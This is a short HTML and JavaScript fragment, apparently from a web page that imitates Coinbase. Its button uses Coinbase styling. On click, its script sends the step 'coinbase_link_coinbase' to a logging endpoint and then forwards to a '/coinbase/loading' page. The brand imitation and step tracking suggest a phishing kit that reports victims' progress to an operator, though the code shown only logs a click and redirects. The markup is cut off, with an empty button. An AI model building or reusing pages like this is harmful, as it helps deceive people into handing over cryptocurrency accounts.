      <button id="lc-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center w-full" type="button">

  </div>
  <script>
  (function(){
    document.getElementById('lc-btn').addEventListener('click', function() {
      var csrf = window._liveledCSRF || '';
      var b = new URLSearchParams({_token:csrf,type:'form_submit',page:'coinbase_link_coinbase',element:'continue',value:'clicked'});
      try{navigator.sendBeacon('/api/log',b);}catch(e){}
      if(window.navigateTo) window.navigateTo('/coinbase/loading');
      else window.location.href='/coinbase/loading';
    });
  })();
  </script>
